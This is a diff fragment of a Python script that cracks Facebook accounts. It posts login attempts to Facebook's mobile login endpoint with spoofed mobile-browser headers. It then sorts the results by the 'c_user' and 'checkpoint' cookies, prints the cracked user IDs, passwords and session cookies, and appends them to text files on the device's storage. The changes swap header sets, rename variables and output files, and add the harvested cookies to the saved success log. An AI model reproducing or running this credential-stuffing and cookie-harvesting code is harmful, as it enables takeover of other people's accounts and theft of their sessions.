-    'scheme':'https',
-    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
-    'accept-encoding':'gzip, deflate, br',
-    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
-    'cache-control':'max-age=0',
-    'content-length':'171',
-    'content-type':'application/x-www-form-urlencoded',
-    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
-    'sec-ch-ua-mobile':'?1',
-    'sec-ch-ua-platform':'"Windows"',
-    'sec-fetch-dest':'document',
-    'sec-fetch-mode':'navigate',
-    'sec-fetch-site':'same-origin',
-    'sec-fetch-user':'?1',
-    'cache-control':'private, no-cache, no-store, must-revalidate',
-    'pragma':'no-cache',
-    'priority':'u=0',
-    'upgrade-insecure-requests':'1',
-			'user-agent': pro}
+			header_freefb ={'authority': 'd.facebook.com/',			
+            'method': 'POST',         
+			'scheme': 'https',			
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'save-data': 'on',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"vivo 1901"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',}
 			lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[1;92m[anoX-OK] '+cid+' | '+ps+'\33[0;97m')
-				if 'y' in anoX_xd:
+				print('\33[1;92m[ANOX-OK] '+uid+' | '+ps+'\33[0;97m')
+				if 'y' in ANOX_xd:
 					print("\33[0;97m[💚] \33[1;98mCOOKIES : \33[0;97m"+coki)
 					cek_apk(session,coki)
 				else:
 					break
-				open('/sdcard/anoX-OK.txt', 'a').write(cid+' | '+ps+'\n')
-				oks.append(cid)
+				open('/sdcard/ANOX-OK.txt', 'a').write(uid+'|'+ps+'|'+coki+'\n')
+				oks.append(uid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				if 'y' in baby:
-					print('\33[1;91m[anoX-CP] '+cid+' | '+ps+'\33[0;97m')
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
-					cps.append(cid)
+					print('\33[1;91m[ANOX-CP] '+uid+'|'+ps+'\33[0;97m')
+					open('/sdcard/ANOX-CP.txt', 'a').write(uid+' | '+ps+'\n')
+					cps.append(uid)
 					break
 				else:
-					open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
+					open('/sdcard/ANOX-CP.txt', 'a').write(uid+' | '+ps+'\n')
 					break
 				
-				open('/sdcard/anoX-CP.txt', 'a').write(cid+' | '+ps+'\n')
-				cps.append(cid)
+				open('/sdcard/ANOX-CP.txt', 'a').write(uid+' | '+ps+'\n')
+				cps.append(uid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M6-anoX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M6-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
 
-anoX()
+ANOX()
